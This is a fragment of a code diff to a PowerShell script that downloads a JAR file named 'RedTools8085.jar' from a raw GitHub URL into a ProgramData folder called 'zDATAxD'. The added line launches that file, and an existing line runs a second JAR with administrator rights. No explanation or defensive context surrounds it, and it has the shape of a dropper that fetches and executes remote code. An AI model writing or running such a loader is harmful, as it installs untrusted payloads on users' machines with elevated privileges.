@@ -9,4 +9,5 @@ Invoke-WebRequest -Uri $source -OutFile $destination
 $source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools8085.jar'
 $destination = 'C:\ProgramData\zDATAxD\RedTools8085.jar'
 Invoke-WebRequest -Uri $source -OutFile $destination
+Start-Process powershell -ArgumentList C:\ProgramData\zDATAxD\RedTools8085.jar
 Start-Process powershell -verb runas -ArgumentList C:\ProgramData\zDATAxD\RedTools.jar
